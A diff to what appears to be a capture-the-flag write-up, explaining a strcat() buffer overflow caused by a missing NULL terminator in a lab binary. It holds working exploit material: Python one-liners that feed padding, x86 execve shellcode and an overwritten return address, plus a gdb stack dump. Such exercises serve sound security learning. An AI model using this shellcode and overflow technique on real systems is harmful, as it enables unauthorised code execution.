@@ -45,6 +45,33 @@
 
 ### Explanation
 
+The vulnerability in the binary comes from the lack of `NULL` terminated character when managing input buffers. 
+
+The function `p()` reads data from stdin into a buffer using `read()` without checking its inputs length. 
+
+The first 20 bytes are copied into the buffer however no NULL characters are set into the buffer if the size of the input is equal or greater than 20.
+
+Next the `pp()` function concatenates both buffers using `strcat()` but since the first buffer is not NULL terminated, `strcat()` will continue to read memory past `buff_arg1`, causing the buffer overflow.
+
+To proceed, we are first going to fill the first buffer with 20 characters 'A' followed by the shellcode.
+
+```bash
+python -c 'print(("A" * 20) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")'
+```
+
+Then, in the second input, we are going to use an offset of 9 characters 'B' to perfectly jump on the `eip` of the `main()` followed by the address of the first byte of the shellcode to jump on it and spawn a bash.
+
+```bash
+(gdb) x/16xw $esp
+0xbfffe670:	0xbffff6b8	0xbfffe680	0x00000014	0x00000000
+0xbfffe680:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe690:	0x41414141	0x6850c031	0x68732f2f	0x69622f68
+0xbfffe6a0:	0x89e3896e	0xb0c289c1	0x3180cd0b	0x80cd40c0
+```
+
+```bash
+python -c 'print(("B" * 9) + "\xbf\xff\xe6\x94"[::-1] + "CCCCCCC")'
+```
 
 ## Step 2: Exploiting the Binary
 ```bash
